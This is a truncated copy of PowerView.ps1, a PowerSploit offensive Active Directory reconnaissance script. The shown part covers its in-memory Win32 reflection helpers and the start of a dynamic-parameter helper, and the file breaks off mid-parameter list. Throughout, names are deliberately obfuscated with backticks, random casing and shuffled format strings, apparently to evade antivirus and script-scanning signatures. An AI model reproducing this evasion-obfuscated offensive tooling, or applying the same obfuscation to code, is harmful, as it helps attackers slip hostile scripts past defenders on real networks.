#requires -version 2

<#

PowerSploit File: PowerView.ps1
Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: None

#>


########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function NEw-i`N`me`Mo`RYM`oDule {
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${mo`DuL`enAme} = [Guid]::NewGuid().ToString()
    )

    ${a`p`PDOmaIn} = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue(${nU`lL}, @())
    ${LoAdedAss`e`MB`LIEs} = ${A`p`pdOM`Ain}.GetAssemblies()

    foreach (${Ass`E`MBly} in ${loaDED`ASs`eMBl`iEs}) {
        if (${aSs`Em`BLy}.FullName -and (${aS`sEMb`Ly}.FullName.Split(',')[0] -eq ${MOduLe`NA`Me})) {
            return ${ass`Em`B`Ly}
        }
    }

    ${dyNA`sSE`MB`lY} = &("{3}{2}{1}{0}"-f 'ect','Obj','-','New') ("{4}{6}{3}{2}{5}{1}{0}" -f'e','am','ssembly','.A','Reflect','N','ion')(${MoD`U`LeNaMe})
    ${do`MaIn} = ${aPp`DoMA`IN}
    ${A`sSEmBlY`B`U`IldEr} = ${do`MA`iN}.DefineDynamicAssembly(${dY`NASS`eM`BLY}, 'Run')
    ${modULEb`Ui`l`dER} = ${aSsEmb`lYBUil`D`eR}.DefineDynamicModule(${MODu`L`e`NamE}, ${F`A`lsE})

    return ${mOD`U`leb`UI`lder}
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function FU`NC {
    Param (
        [Parameter(Position = 0, Mandatory = ${T`RUe})]
        [String]
        ${D`Ll`Name},

        [Parameter(Position = 1, Mandatory = ${T`RuE})]
        [string]
        ${fU`N`ctIO`NNAme},

        [Parameter(Position = 2, Mandatory = ${Tr`Ue})]
        [Type]
        ${Re`Tur`NtYPE},

        [Parameter(Position = 3)]
        [Type[]]
        ${Pa`RameteRtY`pes},

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${n`A`TIveC`AlLInGCoNV`eNTI`ON},

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        ${ChaR`Set},

        [String]
        ${Ent`R`yPo`InT},

        [Switch]
        ${se`TlA`STe`RrOr}
    )

    ${PRO`Pe`Rt`ies} = @{
        DllName = ${D`llNa`me}
        FunctionName = ${FUnc`T`I`ONNAMe}
        ReturnType = ${Ret`URNtY`pE}
    }

    if (${Par`A`MeteRt`yPEs}) { ${prO`P`eRTIES}['ParameterTypes'] = ${PArAMet`E`Rt`Y`PeS} }
    if (${nA`TI`VEc`AL`lINgc`OnveN`TiOn}) { ${PRop`ERti`ES}['NativeCallingConvention'] = ${na`T`IVEcaL`l`ingcOnv`enT`IOn} }
    if (${Ch`A`RsEt}) { ${pROp`e`RtIeS}['Charset'] = ${chA`R`Set} }
    if (${SE`TLAStERR`OR}) { ${pr`o`Per`TiEs}['SetLastError'] = ${SETLa`st`E`RroR} }
    if (${eNTr`y`P`oint}) { ${Pr`OpE`Rti`es}['EntryPoint'] = ${EnTR`Y`POiNT} }

    &("{3}{1}{2}{0}" -f'ject','ew-','Ob','N') ("{0}{1}"-f 'PSO','bject') -Property ${p`Rop`e`RTies}
}


function add`-`wIN32type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=${Tr`Ue}, ValueFromPipelineByPropertyName=${tR`UE})]
        [String]
        ${D`LLnAMe},

        [Parameter(Mandatory=${tr`Ue}, ValueFromPipelineByPropertyName=${TR`UE})]
        [String]
        ${f`UNCT`io`NNa`ME},

        [Parameter(ValueFromPipelineByPropertyName=${t`RUE})]
        [String]
        ${ENt`R`yPoINt},

        [Parameter(Mandatory=${TR`Ue}, ValueFromPipelineByPropertyName=${tr`UE})]
        [Type]
        ${R`ETurn`Ty`PE},

        [Parameter(ValueFromPipelineByPropertyName=${TR`UE})]
        [Type[]]
        ${P`ARaMEteRty`pEs},

        [Parameter(ValueFromPipelineByPropertyName=${t`RUE})]
        [Runtime.InteropServices.CallingConvention]
        ${n`AtI`VeCa`LlIN`gCONvENt`iON} = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName=${tR`Ue})]
        [Runtime.InteropServices.CharSet]
        ${C`haRS`Et} = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName=${tR`Ue})]
        [Switch]
        ${SeT`LAStE`R`R`or},

        [Parameter(Mandatory=${tR`UE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${Mo`DUle},

        [ValidateNotNull()]
        [String]
        ${N`A`MeSPA`Ce} = ''
    )

    BEGIN
    {
        ${ty`P`ehaSH} = @{}
    }

    PROCESS
    {
        if (${MO`du`le} -is [Reflection.Assembly])
        {
            if (${NAM`ESPA`ce})
            {
                ${TYpE`hash}[${d`lLnaME}] = ${MO`D`ULE}.GetType("$Namespace.$DllName")
            }
            else
            {
                ${Ty`peHAsH}[${Dl`l`NAME}] = ${MOD`U`Le}.GetType(${dLLNa`ME})
            }
        }
        else
        {
            # Define one type for each DLL
            if (!${TYp`Eha`SH}.ContainsKey(${d`Lln`AMe}))
            {
                if (${Nam`ESpA`Ce})
                {
                    ${Ty`PEhA`sH}[${DLln`A`me}] = ${MO`Du`Le}.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    ${ty`pe`HA`sh}[${dLl`NAmE}] = ${mo`DU`LE}.DefineType(${DLlna`ME}, 'Public,BeforeFieldInit')
                }
            }

            ${meth`od} = ${t`ypeHA`SH}[${dl`l`NAmE}].DefineMethod(
                ${fu`NC`T`IONNaME},
                'Public,Static,PinvokeImpl',
                ${RETU`R`NtYpE},
                ${PArAME`T`eRTyPES})

            # Make each ByRef parameter an Out parameter
            ${I} = 1
            foreach(${P`A`RaM`etER} in ${P`A`RAM`e`TertYPes})
            {
                if (${P`ArAm`eT`ER}.IsByRef)
                {
                    [void] ${ME`T`hod}.DefineParameter(${i}, 'Out', ${Nu`LL})
                }

                ${i}++
            }

            ${dLL`Im`pORt} = [Runtime.InteropServices.DllImportAttribute]
            ${seTLA`STe`Rro`RFi`eLd} = ${D`lL`iMpoRt}.GetField('SetLastError')
            ${caLlI`NGcO`NVeN`TI`On`Fie`ld} = ${d`llIM`p`ORt}.GetField('CallingConvention')
            ${CHaRs`e`TFI`e`Ld} = ${Dl`l`IM`PoRt}.GetField('CharSet')
            ${E`N`TrypOINtfiE`Ld} = ${D`LlIm`poRt}.GetField('EntryPoint')
            if (${SE`TL`ASt`Er`ROR}) { ${sl`eval`UE} = ${T`RUE} } else { ${SLe`V`ALue} = ${F`ALse} }

            if (${psBoun`dP`A`RAm`EteRS}['EntryPoint']) { ${Ex`pOrtedf`U`N`CnAMe} = ${E`NTRyP`OINT} } else { ${exPORt`Ed`F`U`Ncn`AME} = ${FuNCtI`ONn`AmE} }

            # Equivalent to C# version of [DllImport(DllName)]
            ${C`On`St`RUcToR} = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            ${dL`lIMp`OrTATTR`iB`UTe} = &("{1}{2}{0}"-f 'ct','New-Obj','e') ("{0}{1}{5}{2}{6}{4}{3}" -f'Ref','l','s','Builder','tribute','ection.Emit.Cu','tomAt')(${CO`NStRu`cToR},
                ${Dll`N`AME}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${Se`TLa`s`TERrO`RfI`ElD},
                                           ${ca`l`LInGconventIO`Nfie`lD},
                                           ${cHa`Rse`T`FIelD},
                                           ${en`Tr`yPO`InT`Field}),
                [Object[]] @(${Sleva`l`UE},
                             ([Runtime.InteropServices.CallingConvention] ${natIv`e`c`AlLINGcON`Ven`T`Ion}),
                             ([Runtime.InteropServices.CharSet] ${c`HARsET}),
                             ${ex`poRtEd`Fu`NcNAMe}))

            ${M`Eth`Od}.SetCustomAttribute(${Dl`lImP`oRtAt`TrIBUTe})
        }
    }

    END
    {
        if (${Mo`du`lE} -is [Reflection.Assembly])
        {
            return ${TYp`eh`AsH}
        }

        ${RETU`RN`TyPES} = @{}

        foreach (${k`ey} in ${TY`PEhA`Sh}.Keys)
        {
            ${ty`PE} = ${tYPE`h`ASH}[${k`ey}].CreateType()

            ${Re`TUrn`T`YpES}[${K`Ey}] = ${TY`PE}
        }

        return ${rE`Tu`Rnt`YpEs}
    }
}


function PS`enuM {
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=${Tr`UE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${MoD`Ule},

        [Parameter(Position = 1, Mandatory=${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fUL`L`NaME},

        [Parameter(Position = 2, Mandatory=${t`Rue})]
        [Type]
        ${t`yPE},

        [Parameter(Position = 3, Mandatory=${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${E`Nume`Le`mentS},

        [Switch]
        ${b`iTFI`eLD}
    )

    if (${Mo`d`ULE} -is [Reflection.Assembly])
    {
        return (${m`oDUlE}.GetType(${FUL`Lna`mE}))
    }

    ${ENU`mty`Pe} = ${T`Ype} -as [Type]

    ${EnUmbui`L`D`Er} = ${m`od`ULe}.DefineEnum(${FUl`lname}, 'Public', ${E`NUmt`yPe})

    if (${B`ITf`iEld})
    {
        ${fL`A`Gs`ConStrU`CTor} = [FlagsAttribute].GetConstructor(@())
        ${FlAGS`cUSTOm`At`Trib`UTE} = &("{0}{2}{1}"-f'N','-Object','ew') ("{8}{5}{3}{6}{7}{2}{1}{4}{10}{9}{0}"-f'eBuilder','.C','mit','ction','ustomAttr','efle','.','E','R','ut','ib')(${fl`A`gSCONStrU`ctoR}, @())
        ${eN`U`m`BuIldeR}.SetCustomAttribute(${F`LA`GScU`st`om`ATTrIB`UtE})
    }

    foreach (${K`Ey} in ${en`UmElemeN`Ts}.Keys)
    {
        # Apply the specified enum type to each element
        ${n`ULl} = ${E`N`UMbUild`ER}.DefineLiteral(${K`Ey}, ${EnU`m`eL`Eme`NTs}[${K`eY}] -as ${En`UM`T`ype})
    }

    ${eN`UMB`UiLD`Er}.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function F`IeLd {
    Param (
        [Parameter(Position = 0, Mandatory=${t`Rue})]
        [UInt16]
        ${p`oSi`Ti`On},

        [Parameter(Position = 1, Mandatory=${Tr`Ue})]
        [Type]
        ${tY`PE},

        [Parameter(Position = 2)]
        [UInt16]
        ${of`F`SEt},

        [Object[]]
        ${MarSH`A`laS}
    )

    @{
        Position = ${PoSiTi`On}
        Type = ${T`YPE} -as [Type]
        Offset = ${OfF`S`Et}
        MarshalAs = ${Mars`H`Alas}
    }
}


function STRU`ct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=${t`Rue})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${Mo`Du`Le},

        [Parameter(Position = 2, Mandatory=${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${FUl`l`Na`me},

        [Parameter(Position = 3, Mandatory=${T`Rue})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${str`U`Ct`FIeL`Ds},

        [Reflection.Emit.PackingSize]
        ${p`ACkiNgS`iZE} = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        ${ExpLicI`TlaY`o`Ut}
    )

    if (${M`odULE} -is [Reflection.Assembly])
    {
        return (${mo`dU`lE}.GetType(${Ful`l`Name}))
    }

    [Reflection.TypeAttributes] ${sT`Ru`c`Tat`TrIBUTeS} = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if (${ex`PL`iCiTlay`out})
    {
        ${sTr`Uc`TatTRIBu`T`Es} = ${StrUcT`A`T`Trib`UtES} -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        ${S`TrUCtA`TtR`i`B`UTEs} = ${st`Ru`CTaTt`RI`BUtES} -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    ${sTR`Uc`TBUIldER} = ${mOd`U`LE}.DefineType(${FUlLN`Ame}, ${StrUCtat`TR`Ib`UT`es}, [ValueType], ${PAC`KiN`GSI`ze})
    ${C`ONSt`Ruct`OrIn`Fo} = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    ${siZEc`o`NsT} = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    ${fI`ElDs} = &("{2}{0}{1}" -f 'b','ject','New-O') ("{2}{0}{1}{3}"-f 'sh','table[','Ha',']')(${strUC`TFi`ELds}.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach (${Fi`eLD} in ${S`T`R`UcTFielDS}.Keys)
    {
        ${I`N`dEx} = ${St`R`UctF`IEl`ds}[${FIE`LD}]['Position']
        ${Fi`e`Lds}[${I`N`deX}] = @{FieldName = ${fI`ELD}; Properties = ${sTru`Ctf`i`e`lds}[${fie`Ld}]}
    }

    foreach (${Fi`e`Ld} in ${fI`eL`ds})
    {
        ${FielDN`A`Me} = ${fiE`Ld}['FieldName']
        ${fIE`lDp`RoP} = ${FI`ElD}['Properties']

        ${O`Ff`SeT} = ${fIe`l`dp`ROp}['Offset']
        ${tY`PE} = ${F`iEL`DpRop}['Type']
        ${MaRSH`AL`As} = ${fIEL`d`pROp}['MarshalAs']

        ${N`E`wfIEld} = ${s`TRuc`TB`UIld`eR}.DefineField(${fi`eL`DNa`Me}, ${t`YPe}, 'Public')

        if (${MARS`HAL`AS})
        {
            ${UN`MA`NAG`E`dTYpE} = ${mA`R`ShAlAS}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${m`Arsh`Alas}[1])
            {
                ${s`ize} = ${M`A`RsH`AlaS}[1]
                ${A`TtrI`BBuIldER} = &("{3}{1}{0}{2}"-f'-O','ew','bject','N') ("{4}{5}{10}{0}{6}{7}{1}{8}{2}{3}{9}"-f'n','mit.Cu','omAttribute','Builde','Ref','lect','.','E','st','r','io')(${c`onSt`RUcTor`INfO},
                    ${UN`MAnAGED`Type}, ${S`I`z`ecOnSt}, @(${Si`ZE}))
            }
            else
            {
                ${AttrI`Bbu`IL`DEr} = &("{2}{1}{3}{0}"-f't','-Obje','New','c') ("{9}{4}{5}{7}{1}{0}{2}{3}{10}{8}{6}" -f'to','us','mA','tt','tion.Emi','t.','teBuilder','C','u','Reflec','rib')(${co`N`sTrUCToRI`N`FO}, [Object[]] @(${un`ManA`geDT`Y`PE}))
            }

            ${N`ew`FiE`LD}.SetCustomAttribute(${ATtR`ibb`Ui`ldeR})
        }

        if (${ExpLi`Ci`TL`A`YoUT}) { ${ne`WfI`E`ld}.SetOffset(${Of`FS`et}) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    ${siZEmE`T`HoD} = ${sT`RU`cTbU`Il`Der}.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    ${i`lGe`NeR`ATOr} = ${SiZEm`ET`HOd}.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    ${Il`gENER`A`ToR}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${st`RuctB`Uild`Er})
    ${ILG`eN`ERATor}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    ${ilG`en`ERAtOR}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    ${ilg`EnEra`T`OR}.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    ${i`M`P`liCiT`coN`VeRTeR} = ${S`TrUC`T`BUiLDER}.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        ${sT`RUcT`B`Ui`Lder},
        [Type[]] @([IntPtr]))
    ${ILGe`N`Er`ATOR2} = ${imP`licitC`o`Nver`TEr}.GetILGenerator()
    ${i`LGeNE`RaTOR2}.Emit([Reflection.Emit.OpCodes]::Nop)
    ${iL`gEneR`AtOR2}.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    ${IlG`E`N`eraTor2}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${s`Tr`UcT`BUIL`DER})
    ${iLg`enE`RAtor2}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    ${iLgEN`E`RaTo`R2}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    ${il`geNe`RATOr2}.Emit([Reflection.Emit.OpCodes]::Unbox_Any, ${sTRUCt`Bui`LDEr})
    ${i`lg`EneraT`OR2}.Emit([Reflection.Emit.OpCodes]::Ret)

    ${sTruCt`B`Ui`LDeR}.CreateType()
}


########################################################
#
# Misc. helpers
#
########################################################

Function NEW-dy`N`A`MicPArAMeTeR {
<#
.SYNOPSIS

Helper function to simplify creating dynamic parameters.

    Adapated from https://beatcracker.wordpress.com/2015/08/10/dynamic-parameters-validateset-and-enums/.
    Originally released under the Microsoft Public License (Ms-PL).

.DESCRIPTION

Helper function to simplify creating dynamic parameters.

Example use cases:
    Include parameters only if your environment dictates it
    Include parameters depending on the value of a user-specified parameter
    Provide tab completion and intellisense for parameters, depending on the environment

Please keep in mind that all dynamic parameters you create, will not have corresponding variables created.
    Use New-DynamicParameter with 'CreateVariables' switch in your main code block,
    ('Process' for advanced functions) to create those variables.
    Alternatively, manually reference $PSBoundParameters for the dynamic parameter value.

This function has two operating modes:

1. All dynamic parameters created in one pass using pipeline input to the function. This mode allows to create dynamic parameters en masse,
with one function call. There is no need to create and maintain custom RuntimeDefinedParameterDictionary.

2. Dynamic parameters are created by separate function calls and added to the RuntimeDefinedParameterDictionary you created beforehand.
Then you output this RuntimeDefinedParameterDictionary to the pipeline. This allows more fine-grained control of the dynamic parameters,
with custom conditions and so on.

.NOTES

Credits to jrich523 and ramblingcookiemonster for their initial code and inspiration:
    https://github.com/RamblingCookieMonster/PowerShell/blob/master/New-DynamicParam.ps1
    http://ramblingcookiemonster.wordpress.com/2014/11/27/quick-hits-credentials-and-dynamic-parameters/
    http://jrich523.wordpress.com/2013/05/30/powershell-simple-way-to-add-dynamic-parameters-to-advanced-function/

Credit to BM for alias and type parameters and their handling

.PARAMETER Name

Name of the dynamic parameter

.PARAMETER Type

Type for the dynamic parameter.  Default is string

.PARAMETER Alias

If specified, one or more aliases to assign to the dynamic parameter

.PARAMETER Mandatory

If specified, set the Mandatory attribute for this dynamic parameter

.PARAMETER Position

If specified, set the Position attribute for this dynamic parameter

.PARAMETER HelpMessage

If specified, set the HelpMessage for this dynamic parameter

.PARAMETER DontShow

If specified, set the DontShow for this dynamic parameter.
This is the new PowerShell 4.0 attribute that hides parameter from tab-completion.
http://www.powershellmagazine.com/2013/07/29/pstip-hiding-parameters-from-tab-completion/

.PARAMETER ValueFromPipeline

If specified, set the ValueFromPipeline attribute for this dynamic parameter

.PARAMETER ValueFromPipelineByPropertyName

If specified, set the ValueFromPipelineByPropertyName attribute for this dynamic parameter

.PARAMETER ValueFromRemainingArguments

If specified, set the ValueFromRemainingArguments attribute for this dynamic parameter

.PARAMETER ParameterSetName

If specified, set the ParameterSet attribute for this dynamic parameter. By default parameter is added to all parameters sets.

.PARAMETER AllowNull

If specified, set the AllowNull attribute of this dynamic parameter

.PARAMETER AllowEmptyString

If specified, set the AllowEmptyString attribute of this dynamic parameter

.PARAMETER AllowEmptyCollection

If specified, set the AllowEmptyCollection attribute of this dynamic parameter

.PARAMETER ValidateNotNull

If specified, set the ValidateNotNull attribute of this dynamic parameter

.PARAMETER ValidateNotNullOrEmpty

If specified, set the ValidateNotNullOrEmpty attribute of this dynamic parameter

.PARAMETER ValidateRange

If specified, set the ValidateRange attribute of this dynamic parameter

.PARAMETER ValidateLength

If specified, set the ValidateLength attribute of this dynamic parameter

.PARAMETER ValidatePattern

If specified, set the ValidatePattern attribute of this dynamic parameter

.PARAMETER ValidateScript

If specified, set the ValidateScript attribute of this dynamic parameter

.PARAMETER ValidateSet

If specified, set the ValidateSet attribute of this dynamic parameter

.PARAMETER Dictionary

If specified, add resulting RuntimeDefinedParameter to an existing RuntimeDefinedParameterDictionary.
Appropriate for custom dynamic parameters creation.

If not specified, create and return a RuntimeDefinedParameterDictionary
Appropriate for a simple dynamic parameter creation.
#>

    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = ${T`Rue}, ValueFromPipeline = ${t`Rue}, ValueFromPipelineByPropertyName = ${T`RUe}, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]${n`AMe},

        [Parameter(ValueFromPipelineByPropertyName = ${TR`Ue}, ParameterSetName = 'DynamicParameter')]
        [System.Type]${t`YpE} = [int],

        [Parameter(ValueFromPipelineByPropertyName = ${tr`Ue}, ParameterSetName = 'DynamicParameter')]
        [string[]]${alI`AS},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RUe}, ParameterSetName = 'DynamicParameter')]
        [switch]${M`AND`ATORy},

        [Parameter(ValueFromPipelineByPropertyName = ${Tr`UE}, ParameterSetName = 'DynamicParameter')]
        [int]${PosI`TI`oN},

        [Parameter(ValueFromPipelineByPropertyName = ${Tr`UE}, ParameterSetName = 'DynamicParameter')]
        [string]${Hel`P`MeSSA`ge},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RuE}, ParameterSetName = 'DynamicParameter')]
        [switch]${DOn`TsH`oW},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RUE}, ParameterSetName = 'DynamicParameter')]
        [switch]${V`AlUe`FrOM`pipeLiNE},

        [Parameter(ValueFromPipelineByPropertyName = ${TR`UE}, ParameterSetName = 'DynamicParameter')]
        [switch]${vAlu`eFROMpipe`L`In`EB`Y`P`RO`pErTY`NamE},

        [Parameter(ValueFromPipelineByPropertyName = ${t`Rue}, ParameterSetName = 'DynamicParameter')]
        [switch]${ValUeFROMREMA`iNin`g`Ar`gumenTs},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RUE}, ParameterSetName = 'DynamicParameter')]
        [string]${pARAmEtE`R`seTnA`Me} = '__AllParameterSets',

        [Parameter(ValueFromPipelineByPropertyName = ${T`RuE}, ParameterSetName = 'DynamicParameter')]
        [switch]${AL`lOWnu`LL},

        [Parameter(ValueFromPipelineByPropertyName = ${T`RuE}, ParameterSetName = 'DynamicParameter')]
        [switch]${a`lLo`WEmpt`y`sTRI`Ng},

